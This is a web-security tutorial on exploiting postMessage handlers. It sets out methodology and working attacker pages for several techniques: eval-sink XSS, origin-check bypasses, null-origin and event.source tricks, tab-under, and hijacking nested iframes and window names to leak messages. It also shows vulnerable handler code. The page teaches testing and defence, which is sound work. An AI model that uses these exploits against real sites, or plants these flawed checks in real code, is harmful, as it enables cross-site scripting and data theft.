---
description: >-
  Send cross-origin messages with arbitrary data, which can easily lead to
  Cross-Site Scripting in vulnerable handler that fail to verify the origin
---

# postMessage Exploitation

## Description

The [`window.postMessage()` API](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) in JavaScript allows windows, even from different origins or sites, to communicate using messages. One window can register a listener, and another with a reference to the first window can send it any message. The listener will receive messages from any location and needs to handle the integrity of those messages by itself. See the following example:

<pre class="language-javascript" data-title="https://example1.com"><code class="lang-javascript">async function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Receive response from the child window
<strong>onmessage = async (e) => {
</strong>  console.log("Response:", e.data);
};

onclick = async () => {
  const w = window.open("https://example2.com");
  await sleep(1000);
  // Send initial message
<strong>  w.postMessage("Hello", "*");
</strong>};
</code></pre>

<pre class="language-javascript" data-title="https://example2.com"><code class="lang-javascript">onmessage = async (e) => {
  console.log("Received:", e.data);
  // Send a message back to the parent window
<strong>  e.source.postMessage("echoed " + e.data, "*");
</strong>};
</code></pre>

The above will send a "Hello" message to the opened window, receiving the message and returning an echoed response. The original window will receive this and log the response as "echoed Hello".

## Methodology

1. **Finding postMessage uses**: Use loggers such as [postMessage-tracker](http://github.com/Geluchat/postMessage-tracker) or Burp Suite [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages) to find any messages an application sends while browsing the target application.
2. **Checking sender targetOrigin**: Find calls to `postMessage(message, targetOrigin)` where the `targetOrigin` is a wildcard (`"*"`) or another origin that you control. If the window this method is called on is your domain, you can receive and read this message. The `opener` variable may point to your domain if the target was opened as a new tab from there. If the message is sent to an iframe inside the target page, and the target page itself is framable, you can hijack the location of this inner iframe to intercept the message before it is sent.
3. **Checking listener origins**: Look for listeners registered via `document.onmessage =` or `addEventListener("message", ...)` and check if their function body verifies the `e.origin` of the message correctly. This should be done against a static expected origin or the safe `window.location.origin` variable. Even `window.origin` is unsafe and vulnerable as explained in [#bypassing-window.origin-using-null-origin](postmessage-exploitation.md#bypassing-window.origin-using-null-origin "mention").
4. **Finding vulnerable sinks**: When a handler uses flawed logic to verify the origin, you can send arbitrary messages to it from your origin. Use debugging with breakpoints to follow what the handler does and if the `e.data` reaches any dangerous sinks like `eval(...)` or `location = "javascript:..."`. Remember that your data must fit the [Structured Clone Algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm) which disallows sending functions, but allows a lot more like strings, arrays, objects and some more complex types (more than just JSON).
5. **Exploiting a vulnerability**: After finding a vulnerable sink in a flawed origin check, write a simple HTML page on another origin to exploit it. If the target page allows it, it can be iframed without interaction, but cookies won't always be used. After an interaction with `onclick =` you may open a window to the target page and hold that reference to send messages to exploit it. See the examples below for some different exploitation techniques.

## Handlers & Origin Checks

Another more common vulnerability is vulnerable handlers. If a target site creates a listener with code that does not verify the origin (`e.origin`), it may parse untrusted data. If this wasn't expected, the data may end up in dangerous sinks and allow vulnerabilities like XSS or leaking data through a response to `e.source`.

### Finding handlers

You can find all listeners manually by checking **Global Listeners** in the **DevTools** -> **Sources** tab:

<figure><img src="../../../.gitbook/assets/image (47).png" alt="" width="498"><figcaption><p>List all global message listeners on the current page using DevTools</p></figcaption></figure>

Another option is using extensions that **automatically** log every message being sent. This allows you to get a quick idea of what kind of data is being sent, and if it may be sensitive or dangerous:

{% embed url="http://github.com/Geluchat/postMessage-tracker" %}
**Log** every message to the console, and view the **extension popup** to see a clear **list of handlers** traced to their source
{% endembed %}

{% embed url="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages" %}
In Burp Suite browser, automatically inject canaries into **sources** and look for well-known **sinks**
{% endembed %}

An example of a dangerous handler is the following. Note that it does not verify the origin of the message, and the sent data ends up in a dangerous sink (`eval`):

<pre class="language-javascript" data-title="https://example.com"><code class="lang-javascript"><strong>onmessage = (e) => {
</strong><strong>  eval(e.data);
</strong>};
</code></pre>

An attacker can exploit this by _iframing (1)_ the above page, or by opening a top-level _window (2)_ to it. Then they need to send a `postMessage` to this window that will exploit the sink:

<pre class="language-javascript" data-title="https://attacker.com"><code class="lang-javascript">const iframe = document.createElement("iframe");
<strong>iframe.src = "https://example.com";
</strong>document.body.appendChild(iframe);

// 1. Load it in an iframe, then use .contentWindow to get a reference for sending messages
setTimeout(() => {
<strong>  iframe.contentWindow.postMessage("alert(1)", "*");
</strong>}, 1000);

// 2. After interaction, open a window and send a message to it
onclick = () => {
<strong>  const w = window.open("https://example.com");
</strong>
  setTimeout(() => {
<strong>    w.postMessage("alert(2)", "*");
</strong>  }, 1000);
    };
</code></pre>

Notably, cookies and other resources like localStorage are not available in a third-party context like an iframe where the top-level (address bar) origin is different from the target origin. The only exception to this is `SameSite=None` cookies which are readable or fetch same-origin resources without any CORS limitations.

This means that to really exploit an XSS, you need to **use a window** instead of an iframe because its **top-level** origin is the same as the target origin. You will be able to read any non-httpOnly cookies through `document.cookie`, or use any cookies in a `fetch()` without CORS limitations, gaining full XSS impact.

### More difficult exploits

You won't always find a perfect `eval()` gadget on your input. More common sinks would be similar to [#dom-xss](./#dom-xss "mention"), and `location = ...` where you can pass it a `javascript:` URL. Think creatively about what exactly each vulnerable handler does and how it may be of use in other attacks as well, treat them as **gadgets**.

One thing to highlight is the fact that all data sent must only pass the [Structured Clone Algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm), this is more lax than JSON. In fact, you can send things like `Error`, `Date` or `RegExp`. This flexibility may be useful in more complicated exploits because different types have different features and properties.

Take for example the following vulnerable handler ([taken from the real world](https://x.com/Akhmad_Yudha/status/1813800676377706852)). It takes the `e.data` from our message and calls a window function with that data:

<pre class="language-javascript" data-title="Vulnerable example"><code class="lang-javascript">var data = e.data;
if (typeof (window[data.func]) == "function") {
<strong>    window[data.func].call(null, data);
</strong>}
</code></pre>

It may look easy by just setting `data.func` to `"eval"`, and then providing any arbitrary JavaScript as `data`. But the tricky part is that this first argument is the same object as the one that needs to have the `.func = "eval"` property. Normally, an [`Object`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object) is sent by the application and the called function handles the required properties by itself, but in JavaScript _no such function_ exists that takes an object and evaluates code based on one of its properties.

The trick here is to make use of the Structured Clone Algorithm to do something that is normally impossible in JSON. We make an [`Array`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array) with other properties set on it. An array's `toString()` method will concatenate all its items, so an array like `["1", 2]` would turn into `"1,2"`. This combination gives us the ability to call [`setTimeout()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/setTimeout) with our array as its argument. It will be stringified by `setTimeout`'s implementation and it evaluates any strings it receives.

{% code title="Exploit" %}
```javascript
const a = ["alert(origin)"]
a.func = "setTimeout"
postMessage(a, "*")
```
{% endcode %}

Another situation that's useful to understand is using properties from the prototype of objects when you encounter your input in a _member access_ operation (more info in [#prototype-properties](../../../languages/javascript/#prototype-properties "mention")). The property `constructor.constructor` can grant you the [`Function()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function) constructor, which once again takes a string argument to evaluate.

<pre class="language-javascript" data-title="Vulnerable example"><code class="lang-javascript">const callbacks = {...};
const { category, name } = e.data; 

<strong>callbacks[category][name](e.data)();
</strong></code></pre>

{% code title="Exploit" %}
```javascript
const a = ["alert(origin)"]
a.category = "constructor"
a.name = "constructor"
postMessage(a, "*")
```
{% endcode %}

### Stealthier: tab-under method

Another stealthier way of doing the above is by never letting the user see the target website, only our attacker-controlled website. To do this, we can follow the idea below:

1. Victim visits the attacker's website
2. On interaction, use `window.open` to open a new window to an attacker's page again ("2nd window"). This will gain the focus of the browser now
3. Now the initial window changes its own location to the target page containing a vulnerable postMessage handler, this time in a top-level context
4. The 2nd window will now use `opener.postMessage` as its reference to the vulnerable domain and send the exploit to the postMessage handler. The resulting XSS will now have full access to cookies etc.

{% code title="https://attacker.com" %}
```javascript
// Code for 2nd tab:
setTimeout(() => {
  // After the new tab is opened, send a message to its opener which will have become the target
  opener.postMessage("alert()", "*");
}, 1000);

// Code for 1st tab:
onclick = () => {
  // Duplicate this tab, focus will go to new tab
  const w = window.open(location);
  // Stealthly change the location of the old tab to target
  location = "https://example.com";
};
```
{% endcode %}

### Bypassable origin checks

Websites often protect against the vulnerabilities above by checking the message origin at each handler. It will refuse to execute the potentially dangerous code if it doesn't match the expected origin. The following common examples are safe:

{% code title="Safe Examples" %}
```javascript
onmessage = (e) => {
  // Message must come from https://example.com exactly
  if (e.origin !== "https://example.com") return;
  eval(e.data);  // Dangerous, but we can't reach it cross-origin
}

onmessage = (e) => {
  // Message must come from the current address bar origin
  if (e.origin !== window.location.origin) return;
  eval(e.data);
}
```
{% endcode %}

This requires knowing the exact origin beforehand and comparing it against it, or the frame's origin being the same as the current location. Some developers make this more generic by relaxing the condition slightly, but this can quickly lead to vulnerabilities:

<pre class="language-javascript" data-title="Vulnerable Examples"><code class="lang-javascript">onmessage = (e) => {
<strong>  if (e.origin.startsWith("https://example.com")) return;
</strong>  // ^^ Bypassable using "https://example.com.attacker.com"
}

onmessage = (e) => {
<strong>  if (e.origin.endsWith("example.com")) return;
</strong>  // ^^ Bypassable using "https://anythingexample.com"
}

onmessage = (e) => {
<strong>  if (e.origin.search("^https://sub.example.com$") !== 0) return;
</strong>  // ^^ Bypassable using "https://subXexample.com" because "." matches all
}
</code></pre>

### Bypassing window.origin using `'null'` origin

Another more tricky condition to bypass is the following ([source](https://twitter.com/terjanq/status/1511846053427003393)):

{% code title="Vulnerable Example" %}
```javascript
onmessage = (e) => {
  if (e.origin !== window.origin) return;
  // ^^ Using window.origin instead of window.location.origin is unsafe!
}
```
{% endcode %}

The above is exploitable because using iframe sandboxes, `e.origin` as well as `window.origin` can both be set to `'null'`. After doing so, SameSite=Lax cookies will be used to initiate the top-level request and may have placed a secret CSRF token or user data in the HTML, which can be read by exploiting the `postMessage` handler. The following was a CTF challenge that required you to use this novel technique to steal another identifier causing XSS:

[https://twitter.com/terjanq/status/1446500485142355972](https://twitter.com/terjanq/status/1446500485142355972)

The technique goes as follows:

1. Victim visits the attacker's website
2. Create an iframe with a strict sandbox (excluding `allow-same-origin`) to make its origin `'null'`
3. Inside the `srcdoc` of this frame, open a window to the vulnerable target page after interaction. This will inherit the `'null'` origin so the source and destination are the same, which will bypass the check
4. After the message listener is registered, send a postMessage with the exploit to cause XSS in a `'null'` origin
5. Use this XSS to leak any data on the current page. You **cannot access** resources like cookies or localStorage, and fetches will exclude any cookies because the origin is `'null'` and [SOP](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) is in effect. The idea is to read a CSRF token on the vulnerable page and **exfiltrate** it for another attack

Below is an example of a vulnerable page that registers a message listener and shows sensitive content on the page (cookies directly, but this may be a CSRF token or user data):

<pre class="language-php" data-title="https://example.com"><code class="lang-php">&#x3C;?php
// Vulnerable handler page contains some sensitive data
<strong>print_r($_COOKIE);
</strong>?>
&#x3C;script>
<strong>  onmessage = (e) => {
</strong><strong>    if (e.origin !== window.origin) return;
</strong><strong>    eval(e.data);
</strong>  }
&#x3C;/script>
</code></pre>

This can be exploited with a single click on the following attacker's page:

{% code title="https://attacker.com" %}
```javascript
// Sandboxed iframe to create 'null' origins
const frame = document.createElement("iframe");
frame.sandbox = "allow-scripts allow-popups allow-modals allow-top-navigation";

frame.srcdoc = `
<h1>Click here!</h1>
<script>
onclick = () => {
// Open the target page in a top-level context, including SameSite=Lax cookies
const w = window.open("https://example.com");

setTimeout(() => {
  // Exploit the XSS by reading the body
  w.postMessage("alert(document.body.innerText)", "*");
}, 1000);
}
<\/script>
`;
document.body.appendChild(frame);
```
{% endcode %}

### `event.source` hijacking

The [`.source`](https://developer.mozilla.org/en-US/docs/Web/API/MessageEvent/source) property of a MessageEvent is also sometimes used to check if a message came from a specific frame. It doesn't work with origins, but with window references. For example, one can check if the message came from a specific iframe:

<pre class="language-html" data-title="https://example.com"><code class="lang-html">&#x3C;iframe id="trusted" src="...">&#x3C;/iframe>
&#x3C;script>
  const trusted = document.getElementById("trusted");
  window.addEventListener("message", (e) => {
<strong>    if (e.source !== trusted.contentWindow) return;
</strong>    
    eval(e.data);
  });
&#x3C;/script> 
</code></pre>

It seems pretty safe, as the iframe is made by the website itself, and often contains trusted content. However, if you can inject an Open Redirect into the iframe or if it can proxy messages to the parent, you'll still be able to send messages from there.

If the parent page is itself framable, you can become the `top` and from there navigate any inner iframes to any location, including yours. That way you can also gain control over the "trusted" iframe and send messages from it that the parent will trust. This is similar to exploiting [#nested-iframe](postmessage-exploitation.md#nested-iframe "mention").

<pre class="language-html" data-title="Exploit"><code class="lang-html">&#x3C;iframe id="iframe" src="https://example.com">&#x3C;/iframe>
&#x3C;script>
  // Data to send to the handler
  window.data = "alert(origin)";
  // After example.com has loaded and the frame was created, redirect it to our page
  iframe.onload = () => {
    const inner = iframe.contentWindow.frames[0];
<strong>    inner.location = "about:blank";  // Hijack the inner iframe
</strong>  
    const interval = setInterval(() => {
      inner.origin;  // When it becomes same-origin
      clearInterval(interval);
<strong>      inner.eval("parent.postMessage(top.data, '*')");  // Send to parent from inner
</strong>    })
  }
&#x3C;/script>
</code></pre>

### `event.source` null

There is a way to make `event.source` for your malicious message `null` ([first shared by Omid Rezaei](https://x.com/omidxrz/status/1924490901830639986/photo/1)). This is useful if the security check depends on this value being truthy, for example:

<pre class="language-html" data-title="Vulnerable example"><code class="lang-html">&#x3C;iframe id="trusted" src="...">&#x3C;/iframe>
&#x3C;script>
  const trusted = document.getElementById("trusted");
  window.addEventListener("message", (e) => {
<strong>    if (e.source &#x26;&#x26; e.source !== trusted.contentWindow) return;
</strong>
    eval(e.data);
  });
&#x3C;/script>
</code></pre>

Here, the `e.source &&` part requires that `e.source` is set, and only if so, will check if it is correct. That means if it would be `null`, you would bypass the check.

To make it null, send a message from your own iframe that you instantly remove after sending it. The frame reference will be gone by the time the target receives the message, and cause `e.source` to be null ([source](https://groups.google.com/a/chromium.org/g/chromium-discuss/c/-phtOYVPSHQ/m/zxwRil1Nz0gJ)).\
Our iframe can get a reference to the target page by saving it in a same-origin variable or through [`opener`](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener). Check out the generic exploit below:

<pre class="language-javascript" data-title="Exploit"><code class="lang-javascript">function postMessageNoSource(w, data) {
  window.ref = w;  // Save arguments so iframe can access them
  window.data = data;
  const iframe = document.createElement("iframe");
  iframe.srcdoc = "";
  document.body.appendChild(iframe);
  iframe.onload = () => {
    // Send message from within iframe
<strong>    iframe.contentWindow.eval("top.ref.postMessage(top.data, '*')");
</strong><strong>    iframe.remove();  // Instantly remove it so the .source becomes null
</strong>  };
}

const w = window.open("http://127.0.0.1:8000/vuln.html");
setTimeout(() => {
<strong>  postMessageNoSource(w, "alert(origin)");
</strong>}, 1000);
</code></pre>

This vulnerability can also happen if it loosely compares ([`==`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Equality)) with a frame reference that may or may not exist, and using `.?` can return undefined. This will equal the `null` we can generate:

<pre class="language-javascript" data-title="Vulnerable example"><code class="lang-javascript">const trusted = document.getElementById("may-not-exist");
window.addEventListener("message", (e) => {
<strong>  if (e.source != trusted?.contentWindow) return;
</strong>
  eval(e.data);
});
</code></pre>

## Leaking messages

```javascript
window.postMessage(message, targetOrigin)
```

The first argument is for the _data_ sent. The only requirement for this data is that it can be sent using the [Structured Clone Algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm). The second argument is more interesting for vulnerabilities as it defines the `targetOrigin`. Because JavaScript doesn't know if the window's origin changed between loading the window and sending the message, this argument is another check that **verifies the origin of the window** you are sending a message to is the value in the string. The special `"*"` symbol means a wildcard, or any origin (less secure).

If a website does not verify where it is sending a message, you may be able to receive a message that wasn't intended for you.

### Nested iframe

One trick involving this idea is the fact that **any origin can change the location of frames within an iframe**. If we can iframe a target page that itself loads another iframe, we can change the location of this inner iframe to anything else to intercept messages. The following example uses example.com as the target domain, which loads an iframe of some other trusted page expecting a postMessage:

{% code title="https://example.com" %}
```html
<iframe id="iframe" src="https://inner.example.com"></iframe>
<script>
  iframe.onload = () => {
    // Expects to send to inner.example.com, but wrongly uses "*" to send to any origin
    iframe.contentWindow.postMessage("secret", "*");
  }
</script>
```
{% endcode %}

<pre class="language-javascript" data-title="https://inner.example.com"><code class="lang-javascript"><strong>onmessage = (e) => {
</strong>  console.log("INNER", e.data);
};
</code></pre>

An attacker can abuse this by using the [`window.frames`](https://developer.mozilla.org/en-US/docs/Web/API/Window/frames) property to change the location of this inner iframe, and intercept the secret message:

<pre class="language-html" data-title="https://attacker.com"><code class="lang-html">&#x3C;iframe id="iframe" src="https://example.com">&#x3C;/iframe>
&#x3C;script>
  // After example.com has loaded and the frame was created, redirect it to our page
  iframe.onload = () => {
    const inner = iframe.contentWindow.frames[0];
<strong>    inner.location = "about:blank";  // Hijack the inner iframe
</strong>  	
    const interval = setInterval(() => {
      inner.origin;  // When it becomes same-origin
      clearInterval(interval);
<strong>      inner.onmessage = (e) => {  // Listen for the leaked message
</strong>        alert(e.data);
      }
    })
  }
&#x3C;/script>
</code></pre>

{% embed url="https://web.archive.org/web/20201227141548/https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/" %}
Real-world example of this vulnerability in docs.google.com
{% endembed %}

{% hint style="info" %}
**Note**: this is _only possible_ if you can _iframe the parent page_, because through a regular top-level window reference, you cannot change the location of inner iframes.
{% endhint %}

### Window name hijacking

Instead of iframes, if the _**name**_**&#x20;of a window** in `window.open()` can be predicted, an attacker can prepare an existing window with the same name that will be reused, effectively **hijacking** it! If you open the target from your page and create a same-origin iframe on your page with a specific name, it will find that first and rewrite the location of the iframe, returning a reference to it. Importantly, this iframe is still on the attacker's page.

If the target page would now send a `postMessage(..., "*")` to this newly opened "window", it may have been hijacked by an attacker again to intercept the message.

{% code title="https://example.com" %}
```html
<?php
// Vulnerable page doesn't need to be iframable
header("X-Frame-Options: DENY");
?>
<h1>Vulnerable</h1>
<button onclick="start()">Start</button>
<script>
  function start() {
    w = window.open("/win", "PREDICTABLE_NAME", "popup");
    setTimeout(() => {
      w.postMessage("SECRET_DATA", "*")
    }, 1000)
  }
</script>
```
{% endcode %}

The attacker can now steal the secret data with any same-origin iframe. If the target doesn't allow this, errors often don't include regular response headers. Try a path like `/%00` or a too-long URI:

<pre class="language-html" data-title="https://attacker.com"><code class="lang-html"><strong>&#x3C;iframe src="https://example.com/%00" id="frame" name="PREDICTABLE_NAME">&#x3C;/iframe>
</strong>&#x3C;script>
  onclick = () => {
<strong>    window.open("https://example.com");
</strong>    // When the user triggers https://example.com's popup, it will be placed in 
    // the above iframe. We quickly rewrite it to our origin to leak the message
    // that will be sent to it:
    frame.onload = () => {
      frame.onload = null;
<strong>      frame.srcdoc = `&#x3C;script>
</strong><strong>  onmessage = (e) => alert(e.data)
</strong><strong>  &#x3C;\/script>`;
</strong>    };
  };
&#x3C;/script>
</code></pre>
